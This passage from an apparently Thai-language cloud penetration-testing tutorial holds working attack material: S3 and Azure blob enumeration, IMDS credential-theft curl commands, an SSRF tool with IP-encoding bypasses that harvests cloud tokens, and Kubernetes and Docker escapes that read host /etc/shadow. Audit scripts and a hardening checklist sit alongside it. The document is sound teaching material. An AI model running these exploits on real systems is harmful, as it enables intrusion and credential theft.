            self.s3_auth.get_bucket_encryption(Bucket=bucket_name)
            result['tests']['encryption'] = 'Enabled'
        except ClientError as e:
            if 'ServerSideEncryptionConfigurationNotFoundError' in str(e):
                result['tests']['encryption'] = 'WARNING - Encryption not enabled'
            else:
                result['tests']['encryption'] = 'Cannot check'
        
        return result
    
    def scan_for_sensitive_files(self, bucket_name: str) -> List[str]:
        """ค้นหาไฟล์ที่อาจมีข้อมูลสำคัญ"""
        sensitive_patterns = [
            '.env', '.env.local', '.env.production',
            'config.json', 'config.yml', 'config.yaml',
            'credentials', 'credentials.json', 'credentials.csv',
            'secret', 'secrets.json', 'secrets.yml',
            'database.yml', 'db.json',
            'id_rsa', 'id_rsa.pub', 'id_ed25519',
            'private.key', 'private.pem', 'server.key',
            'backup.sql', 'dump.sql', 'database.sql',
            'passwords.txt', 'pass.txt',
            'backup.zip', 'backup.tar.gz',
            'wp-config.php', 'settings.php',
            'application.properties', 'appsettings.json'
        ]
        
        found = []
        for pattern in sensitive_patterns:
            try:
                response = self.s3_auth.get_object(Bucket=bucket_name, Key=pattern)
                size = response['ContentLength']
                found.append(f"{pattern} ({size} bytes)")
            except ClientError as e:
                code = e.response['Error']['Code']
                if code not in ['NoSuchKey', 'AccessDenied', '403']:
                    pass
        
        return found
    
    def find_public_buckets_from_wordlist(self, wordlist: List[str]) -> List[str]:
        """ค้นหา public buckets จาก wordlist"""
        public_buckets = []
        
        def check_bucket(name):
            try:
                response = requests.get(f'https://{name}.s3.amazonaws.com', timeout=5)
                if response.status_code == 200:
                    return name
                elif response.status_code == 403:
                    # Bucket exists but private
                    return f"{name} (exists but private)"
            except:
                pass
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_bucket, name): name for name in wordlist}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    public_buckets.append(result)
        
        return public_buckets

if __name__ == '__main__':
    tester = S3SecurityTester()
    
    # ทดสอบ bucket ที่รู้ชื่ออยู่แล้ว
    result = tester.check_bucket_public_access('target-company-backup')
    print(f"\n=== S3 Security Test: {result['bucket']} ===")
    for test, status in result['tests'].items():
        icon = '[!]' if 'VULNERABLE' in status or 'CRITICAL' in status or 'WARNING' in status else '[+]'
        print(f"{icon} {test}: {status}")
    
    # ค้นหาไฟล์สำคัญ
    sensitive = tester.scan_for_sensitive_files('target-company-backup')
    if sensitive:
        print("\n[!] Sensitive files found:")
        for f in sensitive:
            print(f"  - {f}")
```

### Azure Blob Storage Testing

```bash
# ตรวจสอบ Azure Blob public access
az storage account list --query '[*].[name,allowBlobPublicAccess]' --output table

# List public containers
az storage container list \
  --account-name ACCOUNT_NAME \
  --output table

# ดาวน์โหลดไฟล์จาก public blob
az storage blob download \
  --account-name ACCOUNT_NAME \
  --container-name CONTAINER_NAME \
  --name filename.txt \
  --file /tmp/downloaded.txt \
  --no-auth-required

# Enumerate blobs anonymously
curl 'https://ACCOUNT_NAME.blob.core.windows.net/CONTAINER_NAME?restype=container&comp=list'

# ค้นหา SAS tokens ที่ expire ไม่ถูกต้อง
az storage container generate-sas \
  --account-name ACCOUNT_NAME \
  --name CONTAINER_NAME \
  --permissions rl \
  --expiry 2099-12-31  # SAS token ที่ไม่ควรมีอายุยาวนานขนาดนี้
```

---

## 7. Metadata Service Exploitation

### AWS IMDSv1 vs IMDSv2

```bash
# IMDSv1 (เก่า - ไม่ต้องการ session token - VULNERABLE)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName

# ผลลัพธ์:
# {
#   "Code": "Success",
#   "LastUpdated": "2024-01-01T10:00:00Z",
#   "Type": "AWS-HMAC",
#   "AccessKeyId": "ASIAXXXXXXXXXXXXXXXX",
#   "SecretAccessKey": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
#   "Token": "IQoJb3JpZ2luX2VjEAAAAAAAAAAAAAA...",
#   "Expiration": "2024-01-01T16:00:00Z"
# }

# IMDSv2 (ใหม่ - ต้องการ PUT request ก่อน)
# ขั้นตอนที่ 1: ขอ session token
TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')

# ขั้นตอนที่ 2: ใช้ token ในการเข้าถึง metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# ข้อมูล metadata อื่นๆ
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/meta-data/security-groups
curl http://169.254.169.254/latest/meta-data/placement/region
curl http://169.254.169.254/latest/user-data  # อาจมี secrets!
```

### SSRF to Cloud Metadata

```python
#!/usr/bin/env python3
# ssrf_to_metadata.py - ทดสอบ SSRF ที่นำไปสู่ cloud metadata

import requests
from typing import Optional, Dict, List
import json

class CloudSSRFTester:
    def __init__(self, target_url: str, ssrf_param: str):
        self.target_url = target_url
        self.ssrf_param = ssrf_param  # parameter ที่ vulnerable
        self.session = requests.Session()
    
    def test_ssrf_to_aws_imds(self) -> Optional[Dict]:
        """ทดสอบ SSRF -> AWS IMDS"""
        # URL ต่างๆ ที่ใช้ bypass ได้
        imds_urls = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            # IPv6
            'http://[::ffff:169.254.169.254]/latest/meta-data/',
            # Decimal encoding
            'http://2852039166/latest/meta-data/',
            # Hex encoding  
            'http://0xa9fea9fe/latest/meta-data/',
            # Octal
            'http://0251.0376.0251.0376/latest/meta-data/',
            # DNS rebinding domain
            'http://169.254.169.254.nip.io/latest/meta-data/',
        ]
        
        for url in imds_urls:
            try:
                # ทดสอบผ่าน SSRF
                response = self.session.get(
                    self.target_url,
                    params={self.ssrf_param: url},
                    timeout=10
                )
                
                if 'ami-id' in response.text or 'security-credentials' in response.text:
                    print(f"[CRITICAL] SSRF to AWS IMDS via: {url}")
                    
                    # ดึง credentials
                    cred_url = url.rstrip('/') + '/iam/security-credentials/'
                    cred_response = self.session.get(
                        self.target_url,
                        params={self.ssrf_param: cred_url},
                        timeout=10
                    )
                    
                    # ดึงชื่อ role
                    role_name = cred_response.text.strip()
                    
                    # ดึง credentials ของ role
                    full_cred_url = cred_url + role_name
                    full_cred_response = self.session.get(
                        self.target_url,
                        params={self.ssrf_param: full_cred_url},
                        timeout=10
                    )
                    
                    try:
                        credentials = json.loads(full_cred_response.text)
                        return {
                            'provider': 'AWS',
                            'ssrf_url': url,
                            'credentials': credentials
                        }
                    except json.JSONDecodeError:
                        return {'provider': 'AWS', 'ssrf_url': url, 'raw': cred_response.text}
            
            except Exception as e:
                continue
        
        return None
    
    def test_ssrf_to_azure_imds(self) -> Optional[Dict]:
        """ทดสอบ SSRF -> Azure IMDS"""
        azure_url = 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
        
        # Azure ต้องการ header Metadata: true
        # แต่บาง SSRF อาจส่ง custom headers ได้
        try:
            response = self.session.get(
                self.target_url,
                params={
                    self.ssrf_param: azure_url,
                    'metadata': 'true'  # บางครั้ง app ส่ง params เป็น headers
                },
                timeout=10
            )
            
            if 'subscriptionId' in response.text or 'resourceGroupName' in response.text:
                print(f"[CRITICAL] SSRF to Azure IMDS successful!")
                
                # ดึง managed identity token
                token_url = 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
                token_response = self.session.get(
                    self.target_url,
                    params={self.ssrf_param: token_url},
                    timeout=10
                )
                
                return {
                    'provider': 'Azure',
                    'instance_info': response.text[:500],
                    'token': token_response.text[:500]
                }
        except Exception:
            pass
        
        return None
    
    def test_ssrf_to_gcp_metadata(self) -> Optional[Dict]:
        """ทดสอบ SSRF -> GCP Metadata"""
        # GCP Metadata server
        gcp_urls = [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        ]
        
        for url in gcp_urls:
            try:
                response = self.session.get(
                    self.target_url,
                    params={
                        self.ssrf_param: url,
                        'Metadata-Flavor': 'Google'
                    },
                    timeout=10
                )
                
                if 'access_token' in response.text or 'project-id' in response.text:
                    print(f"[CRITICAL] SSRF to GCP Metadata via: {url}")
                    return {
                        'provider': 'GCP',
                        'ssrf_url': url,
                        'response': response.text[:1000]
                    }
            except Exception:
                continue
        
        return None
    
    def run_all_tests(self) -> Dict:
        print(f"[*] Testing SSRF to cloud metadata: {self.target_url}")
        results = {}
        
        aws_result = self.test_ssrf_to_aws_imds()
        if aws_result:
            results['aws'] = aws_result
        
        azure_result = self.test_ssrf_to_azure_imds()
        if azure_result:
            results['azure'] = azure_result
        
        gcp_result = self.test_ssrf_to_gcp_metadata()
        if gcp_result:
            results['gcp'] = gcp_result
        
        if not results:
            print("[*] No cloud metadata SSRF vulnerabilities found")
        else:
            print(f"\n[!!!] CRITICAL - Cloud metadata accessible via SSRF!")
            print(json.dumps(results, indent=2))
        
        return results

# ตัวอย่าง:
# tester = CloudSSRFTester('https://vulnerable-app.com/fetch', 'url')
# tester.run_all_tests()
```

---

## 8. Serverless Security

### Lambda Security Testing

```python
#!/usr/bin/env python3
# lambda_security.py - ทดสอบความปลอดภัยของ Lambda functions

import boto3
import json
import base64
from typing import List, Dict

class LambdaSecurityTester:
    def __init__(self):
        self.lambda_client = boto3.client('lambda')
        self.iam_client = boto3.client('iam')
    
    def enumerate_functions(self) -> List[Dict]:
        """รวบรวมข้อมูล Lambda functions"""
        functions = []
        paginator = self.lambda_client.get_paginator('list_functions')
        
        for page in paginator.paginate():
            for func in page['Functions']:
                func_detail = {
                    'name': func['FunctionName'],
                    'arn': func['FunctionArn'],
                    'runtime': func.get('Runtime', 'N/A'),
                    'role': func.get('Role', 'N/A'),
                    'env_vars': func.get('Environment', {}).get('Variables', {}),
                    'timeout': func.get('Timeout', 0),
                    'memory': func.get('MemorySize', 0),
                    'vpc_config': func.get('VpcConfig', {})
                }
                functions.append(func_detail)
        
        return functions
    
    def check_secrets_in_env(self, function_name: str) -> List[str]:
        """ตรวจสอบ secrets ใน environment variables"""
        SENSITIVE_KEYS = [
            'password', 'passwd', 'pass', 'secret', 'key', 'token',
            'credential', 'auth', 'api_key', 'apikey', 'access_key',
            'private', 'database', 'db_pass', 'mysql', 'postgres',
            'redis', 'mongodb', 'connection_string'
        ]
        
        response = self.lambda_client.get_function_configuration(FunctionName=function_name)
        env_vars = response.get('Environment', {}).get('Variables', {})
        
        findings = []
        for key, value in env_vars.items():
            if any(sensitive in key.lower() for sensitive in SENSITIVE_KEYS):
                findings.append(f"{key}={value[:20]}...")
        
        return findings
    
    def check_function_permissions(self, function_name: str) -> Dict:
        """ตรวจสอบ resource-based policy ของ function"""
        try:
            response = self.lambda_client.get_policy(FunctionName=function_name)
            policy = json.loads(response['Policy'])
            
            issues = []
            for statement in policy.get('Statement', []):
                principal = statement.get('Principal', {})
                # ตรวจสอบ wildcard
                if principal == '*' or principal.get('AWS') == '*' or principal.get('Service') == '*':
                    issues.append('WARNING: Wildcard principal allows anyone to invoke function!')
                
                # ตรวจสอบ cross-account
                if statement.get('Effect') == 'Allow':
                    for arn in str(principal).split('arn:aws:'):
                        if 'iam::' in arn:
                            account_id = arn.split('iam::')[1].split(':')[0]
                            if account_id not in boto3.client('sts').get_caller_identity()['Account']:
                                issues.append(f'Cross-account access from {account_id}')
            
            return {'policy': policy, 'issues': issues}
        except self.lambda_client.exceptions.ResourceNotFoundException:
            return {'policy': None, 'issues': ['No resource policy (invoke by owner only)']}
    
    def check_role_permissions(self, role_arn: str) -> List[str]:
        """ตรวจสอบว่า Lambda role มีสิทธิ์เกินจำเป็นไหม"""
        role_name = role_arn.split('/')[-1]
        overprivileged = []
        
        # ตรวจสอบ attached policies
        attached = self.iam_client.list_attached_role_policies(RoleName=role_name)
        for policy in attached['AttachedPolicies']:
            if policy['PolicyName'] in ['AdministratorAccess', 'PowerUserAccess']:
                overprivileged.append(f"CRITICAL: Lambda role has {policy['PolicyName']}")
        
        # ตรวจสอบ inline policies
        inline = self.iam_client.list_role_policies(RoleName=role_name)
        for policy_name in inline['PolicyNames']:
            doc = self.iam_client.get_role_policy(RoleName=role_name, PolicyName=policy_name)
            for stmt in doc['PolicyDocument'].get('Statement', []):
                if stmt.get('Effect') == 'Allow':
                    action = stmt.get('Action', [])
                    if isinstance(action, str):
                        action = [action]
                    if '*' in action or any('*' in a for a in action):
                        overprivileged.append(f"WARNING: Wildcard action in {policy_name}: {action}")
        
        return overprivileged
    
    def audit_all_functions(self) -> None:
        print("[*] Starting Lambda Security Audit...")
        functions = self.enumerate_functions()
        print(f"[*] Found {len(functions)} Lambda functions\n")
        
        for func in functions:
            print(f"=== {func['name']} ===")
            print(f"  Runtime: {func['runtime']}")
            print(f"  Role: {func['role']}")
            
            # ตรวจสอบ secrets
            secrets = self.check_secrets_in_env(func['name'])
            if secrets:
                print(f"  [!] Potential secrets in env vars:")
                for s in secrets:
                    print(f"    - {s}")
            
            # ตรวจสอบ permissions
            perms = self.check_function_permissions(func['name'])
            if perms['issues']:
                for issue in perms['issues']:
                    print(f"  [!] {issue}")
            
            # ตรวจสอบ role
            role_issues = self.check_role_permissions(func['role'])
            for issue in role_issues:
                print(f"  [!] {issue}")
            
            print()

if __name__ == '__main__':
    tester = LambdaSecurityTester()
    tester.audit_all_functions()
```

---

## 9. Container Orchestration Security

### Kubernetes Security Testing

```bash
# ===== การเข้าถึง Kubernetes cluster =====

# รับ kubeconfig จาก cloud
aws eks update-kubeconfig --cluster-name my-cluster --region ap-southeast-1
az aks get-credentials --resource-group MyRG --name my-cluster
gcloud container clusters get-credentials my-cluster --zone asia-southeast1-a

# ตรวจสอบ access
kubectl auth can-i --list
kubectl auth can-i create pods --all-namespaces
kubectl auth can-i get secrets --all-namespaces

# Enumerate resources
kubectl get all --all-namespaces
kubectl get secrets --all-namespaces
kubectl get configmaps --all-namespaces
kubectl get serviceaccounts --all-namespaces

# ดู secrets (ถ้ามีสิทธิ์)
kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o yaml
kubectl get secret <SECRET_NAME> -n <NAMESPACE> \
  -o jsonpath='{.data}' | python3 -c "import sys,json,base64; d=json.load(sys.stdin); [print(k, base64.b64decode(v).decode()) for k,v in d.items()]"

# === K8s Privilege Escalation ===

# 1. Create privileged pod
cat > /tmp/privesc-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
  namespace: default
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  containers:
  - name: privesc
    image: ubuntu:latest
    command: ["/bin/bash", "-c", "sleep 9999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

kubectl apply -f /tmp/privesc-pod.yaml
kubectl exec -it privesc-pod -- bash
# ตอนนี้เราสามารถเข้าถึง host filesystem ได้!
# ls /host/etc/kubernetes/pki/  # ดู K8s certificates
# cat /host/etc/shadow           # ดู password hashes

# 2. Service Account Token Theft
# ใน pod:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# ใช้ token เข้าถึง API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets

# 3. RBAC Misconfiguration
# ตรวจสอบ cluster-admin bindings
kubectl get clusterrolebindings -o json | \
  python3 -c "
import sys,json
d=json.load(sys.stdin)
for item in d['items']:
    if item['roleRef']['name']=='cluster-admin':
        subjects = item.get('subjects',[])
        for s in subjects:
            print(f'cluster-admin: {s.get(\"kind\",\"N/A\")}/{s.get(\"name\",\"N/A\")} in {s.get(\"namespace\",\"cluster-wide\")}')
"
```

### Docker Security Testing

```bash
# ตรวจสอบ Docker socket
ls -la /var/run/docker.sock
# ถ้า mount ใน container:
ls -la /var/run/docker.sock  # เข้าถึง Docker daemon ของ host

# Docker socket escape
docker run -v /:/host -it ubuntu chroot /host
# หรือ
docker run --privileged --pid=host -it ubuntu nsenter -t 1 -m -u -i -n -p sh

# Trivy - Container vulnerability scanner
apt install trivy
trivy image ubuntu:latest
trivy image --severity HIGH,CRITICAL nginx:latest

# ตรวจสอบ Dockerfile best practices
docker run --rm -v $(pwd):/project hadolint/hadolint hadolint /project/Dockerfile

# Docker Bench Security
docker run -it --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security \
  docker/docker-bench-security
```

---

## 10. Cloud Automation Tools

### CloudMapper - AWS Visualization

```bash
# ติดตั้ง
git clone https://github.com/duo-labs/cloudmapper.git
cd cloudmapper
pip3 install -r requirements.txt

# Config
cat > config.json << 'EOF'
{
  "accounts": [
    {
      "id": "123456789012",
      "name": "production",
      "regions": ["ap-southeast-1"]
    }
  ]
}
EOF

# Collect data
python3 cloudmapper.py collect --account production

# Generate network map
python3 cloudmapper.py prepare --account production
python3 cloudmapper.py webserver
# เปิด http://localhost:8000

# Audit
python3 cloudmapper.py audit --account production
```

### Prowler - Cloud Security Assessments

```bash
# ติดตั้ง Prowler
pip3 install prowler

# AWS audit
prowler aws --profile default

# รัน specific checks
prowler aws --checks s3_bucket_public_access
prowler aws --group iam
prowler aws --compliance cis_1.5_aws

# Azure audit
prowler azure --sp-env-auth

# GCP audit
prowler gcp --project-ids PROJECT_ID

# สร้าง HTML report
prowler aws --output-formats html --output-directory /tmp/prowler-reports
```

### Cloud Security Automation Script

```python
#!/usr/bin/env python3
# cloud_security_audit.py - Automated cloud security audit

import boto3
import json
import datetime
from typing import Dict, List

class CloudSecurityAudit:
    def __init__(self):
        self.session = boto3.Session()
        self.findings = []
        self.report = {
            'timestamp': datetime.datetime.now().isoformat(),
            'findings': [],
            'summary': {}
        }
    
    def add_finding(self, severity: str, service: str, title: str, description: str, remediation: str):
        self.report['findings'].append({
            'severity': severity,
            'service': service,
            'title': title,
            'description': description,
            'remediation': remediation
        })
    
    def audit_iam(self):
        """ตรวจสอบ IAM configuration"""
        iam = self.session.client('iam')
        print("[*] Auditing IAM...")
        
        # ตรวจสอบ root account access keys
        try:
            response = iam.get_account_summary()
            summary = response['SummaryMap']
            
            if summary.get('AccountAccessKeysPresent', 0) > 0:
                self.add_finding(
                    'CRITICAL', 'IAM',
                    'Root Account Access Keys Exist',
                    'Root account มี access keys ซึ่งเป็น security risk สูงมาก',
                    'Delete root account access keys, use IAM users instead'
                )
        except Exception as e:
            print(f"  [!] Error checking root keys: {e}")
        
        # ตรวจสอบ MFA
        try:
            users = iam.list_users()['Users']
            for user in users:
                mfa_devices = iam.list_mfa_devices(UserName=user['UserName'])['MFADevices']
                if not mfa_devices:
                    # ตรวจสอบว่ามี password login ไหม
                    try:
                        iam.get_login_profile(UserName=user['UserName'])
                        self.add_finding(
                            'HIGH', 'IAM',
                            f'User {user["UserName"]} has no MFA',
                            'User มี console access แต่ไม่ได้ตั้ง MFA',
                            'Enable MFA for all IAM users with console access'
                        )
                    except iam.exceptions.NoSuchEntityException:
                        pass  # ไม่มี console access
        except Exception as e:
            print(f"  [!] Error checking MFA: {e}")
        
        # ตรวจสอบ password policy
        try:
            policy = iam.get_account_password_policy()['PasswordPolicy']
            if policy.get('MinimumPasswordLength', 0) < 14:
                self.add_finding(
                    'MEDIUM', 'IAM',
                    'Weak Password Policy',
                    f'Password length {policy.get("MinimumPasswordLength",0)} < 14 characters',
                    'Set minimum password length to at least 14 characters'
                )
        except iam.exceptions.NoSuchEntityException:
            self.add_finding(
                'HIGH', 'IAM',
                'No Account Password Policy',
                'ไม่มี account-level password policy',
                'Configure a strong password policy'
            )
    
    def audit_s3(self):
        """ตรวจสอบ S3 configuration"""
        s3 = self.session.client('s3')
        print("[*] Auditing S3...")
        
        try:
            buckets = s3.list_buckets()['Buckets']
            for bucket in buckets:
                name = bucket['Name']
                
                # ตรวจสอบ public access block
                try:
                    bpa = s3.get_public_access_block(Bucket=name)
                    config = bpa['PublicAccessBlockConfiguration']
                    if not all(config.values()):
                        self.add_finding(
                            'HIGH', 'S3',
                            f'Bucket {name} - Public Access Not Fully Blocked',
                            f'Block Public Access settings: {config}',
                            'Enable all Block Public Access settings'
                        )
                except s3.exceptions.NoSuchPublicAccessBlockConfiguration:
                    self.add_finding(
                        'HIGH', 'S3',
                        f'Bucket {name} - No Public Access Block',
                        'Bucket ไม่มีการตั้งค่า Block Public Access',
                        'Enable Block Public Access on all S3 buckets'
                    )
                
                # ตรวจสอบ encryption
                try:
                    s3.get_bucket_encryption(Bucket=name)
                except s3.exceptions.ServerSideEncryptionConfigurationNotFoundError:
                    self.add_finding(
                        'MEDIUM', 'S3',
                        f'Bucket {name} - No Default Encryption',
                        'Bucket ไม่มี default encryption',
                        'Enable default encryption (AES-256 or aws:kms)'
                    )
                
                # ตรวจสอบ versioning
                versioning = s3.get_bucket_versioning(Bucket=name)
                if versioning.get('Status') != 'Enabled':
                    self.add_finding(
                        'LOW', 'S3',
                        f'Bucket {name} - Versioning Disabled',
                        'Versioning ไม่ได้เปิด ทำให้ไม่สามารถ recover files ได้',
                        'Enable versioning for important buckets'
                    )
        
        except Exception as e:
            print(f"  [!] Error auditing S3: {e}")
    
    def audit_cloudtrail(self):
        """ตรวจสอบ CloudTrail"""
        cloudtrail = self.session.client('cloudtrail')
        print("[*] Auditing CloudTrail...")
        
        try:
            trails = cloudtrail.describe_trails()['trailList']
            
            if not trails:
                self.add_finding(
                    'CRITICAL', 'CloudTrail',
                    'CloudTrail Not Enabled',
                    'ไม่มี CloudTrail trail ทำให้ไม่สามารถ audit activities ได้',
                    'Enable CloudTrail for all regions'
                )
                return
            
            multi_region_enabled = False
            for trail in trails:
                if trail.get('IsMultiRegionTrail'):
                    multi_region_enabled = True
                
                if not trail.get('LogFileValidationEnabled'):
                    self.add_finding(
                        'MEDIUM', 'CloudTrail',
                        f'Trail {trail["Name"]} - Log Validation Disabled',
                        'ไม่มีการ validate log files ทำให้ logs อาจถูกแก้ไข',
                        'Enable log file validation'
                    )
            
            if not multi_region_enabled:
                self.add_finding(
                    'HIGH', 'CloudTrail',
                    'No Multi-Region Trail',
                    'ไม่มี multi-region trail ทำให้ activities ในบาง regions ไม่ถูก log',
                    'Create a multi-region CloudTrail trail'
                )
        
        except Exception as e:
            print(f"  [!] Error auditing CloudTrail: {e}")
    
    def generate_report(self) -> str:
        """สร้าง audit report"""
        critical = [f for f in self.report['findings'] if f['severity'] == 'CRITICAL']
        high = [f for f in self.report['findings'] if f['severity'] == 'HIGH']
        medium = [f for f in self.report['findings'] if f['severity'] == 'MEDIUM']
        low = [f for f in self.report['findings'] if f['severity'] == 'LOW']
        
        self.report['summary'] = {
            'total': len(self.report['findings']),
            'critical': len(critical),
            'high': len(high),
            'medium': len(medium),
            'low': len(low)
        }
        
        report_text = f"""
================================================================
            AWS CLOUD SECURITY AUDIT REPORT
================================================================
Date: {self.report['timestamp']}
Total Findings: {self.report['summary']['total']}
  Critical: {self.report['summary']['critical']}
  High:     {self.report['summary']['high']}
  Medium:   {self.report['summary']['medium']}
  Low:      {self.report['summary']['low']}
----------------------------------------------------------------
"""
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            findings = [f for f in self.report['findings'] if f['severity'] == severity]
            if findings:
                report_text += f"\n=== {severity} ({len(findings)}) ===\n"
                for i, finding in enumerate(findings, 1):
                    report_text += f"""
{i}. [{finding['service']}] {finding['title']}
   Description: {finding['description']}
   Remediation: {finding['remediation']}
"""
        
        return report_text
    
    def run_full_audit(self):
        print("\n[*] Starting AWS Cloud Security Audit...\n")
        self.audit_iam()
        self.audit_s3()
        self.audit_cloudtrail()
        
        report = self.generate_report()
        print(report)
        
        # บันทึก JSON report
        with open('/tmp/cloud-audit-report.json', 'w') as f:
            json.dump(self.report, f, indent=2)
        print("\n[*] Full report saved to /tmp/cloud-audit-report.json")

if __name__ == '__main__':
    audit = CloudSecurityAudit()
    audit.run_full_audit()
```

---

## แบบฝึกหัด (Labs)

### Lab 1: AWS IAM Privilege Escalation

```bash
# Setup: สร้าง user ที่มีสิทธิ์น้อย
aws iam create-user --user-name lab-user
aws iam create-access-key --user-name lab-user

# สร้าง policy ที่มีสิทธิ์น้อยแต่มี iam:AttachUserPolicy
cat > /tmp/limited-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "iam:AttachUserPolicy",
        "iam:ListUsers",
        "s3:ListAllMyBuckets"
      ],
      "Resource": "*"
    }
  ]
}
EOF

aws iam create-policy --policy-name LimitedPolicy --policy-document file:///tmp/limited-policy.json
aws iam attach-user-policy --user-name lab-user --policy-arn arn:aws:iam::123456789012:policy/LimitedPolicy

# Challenge: ใช้สิทธิ์ที่มีเพื่อ escalate เป็น Admin
# Hint: ใช้ AttachUserPolicy เพื่อแนบ AdministratorAccess
```

### Lab 2: S3 Bucket Enumeration

```bash
# สร้าง list ชื่อ company สำหรับทดสอบ
cat > /tmp/company-names.txt << 'EOF'
target-company
target-company-backup
target-company-dev
target-company-staging
target-company-prod
target-company-logs
target-company-data
EOF

# สร้าง script ทดสอบ
while read bucket; do
  aws s3 ls s3://$bucket --no-sign-request 2>/dev/null && echo "[PUBLIC] $bucket"
done < /tmp/company-names.txt

# หรือใช้ s3scanner
git clone https://github.com/sa7mon/S3Scanner
cd S3Scanner && pip3 install -r requirements.txt
python3 s3scanner.py --bucket-file /tmp/company-names.txt --dump --out-file /tmp/found-buckets.txt
```

### Lab 3: Kubernetes Escape to Host

```bash
# สร้าง privileged pod
kubectl apply -f - << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: escape-test
spec:
  containers:
  - name: ubuntu
    image: ubuntu:20.04
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-fs
      mountPath: /host
  volumes:
  - name: host-fs
    hostPath:
      path: /
EOF

# เข้าสู่ pod
kubectl exec -it escape-test -- bash

# เข้าถึง host filesystem
ls /host/etc/kubernetes/
cat /host/etc/shadow

# หรือ chroot เข้า host
chroot /host /bin/bash
```

---

## สรุป Cloud Security Testing

| หัวข้อ | Tool | Command หลัก |
|--------|------|---------------|
| AWS Enumeration | aws cli | `aws iam list-users`, `aws s3 ls` |
| AWS Privilege Escalation | Pacu | `run iam__privesc_scan` |
| S3 Security | S3Scanner | `python3 s3scanner.py` |
| Azure Enumeration | az cli | `az ad user list` |
| GCP Enumeration | gcloud | `gcloud projects get-iam-policy` |
| Cloud SSRF | Manual | curl IMDS URLs |
| K8s Security | kubectl | `kubectl auth can-i --list` |
| Container Security | Trivy | `trivy image target:latest` |
| Full Cloud Audit | Prowler | `prowler aws --group iam` |
| Visualization | CloudMapper | `python3 cloudmapper.py prepare` |

### Cloud Security Checklist

```
[ ] IAM: Root account MFA enabled
[ ] IAM: No root access keys
[ ] IAM: MFA required for all console users
[ ] IAM: Strong password policy
[ ] IAM: No users with AdministratorAccess (use roles)
[ ] S3: Block Public Access enabled on all buckets
[ ] S3: Default encryption enabled
[ ] S3: Versioning enabled for important buckets
[ ] S3: Access logging enabled
[ ] CloudTrail: Multi-region trail active
[ ] CloudTrail: Log file validation enabled
[ ] CloudTrail: Logs encrypted
[ ] VPC: Flow logs enabled
[ ] VPC: Security groups follow least privilege
[ ] EC2: IMDSv2 required
[ ] EC2: No public instances with SSH open to 0.0.0.0/0
[ ] Lambda: No secrets in environment variables
[ ] Lambda: Minimal IAM permissions
[ ] RDS: Not publicly accessible
[ ] RDS: Encryption at rest enabled
[ ] Secrets: Use Secrets Manager, not environment variables
[ ] Logging: CloudWatch alerts for suspicious activity
[ ] GuardDuty: Enabled in all regions
[ ] Config: AWS Config rules enabled
[ ] SecurityHub: Enabled and configured
```

---

← [Part 70: Bug Bounty Methodology](Part-70-Bug-Bounty.md) | [Part 72: Container Security](Part-72-Container-Security.md) →
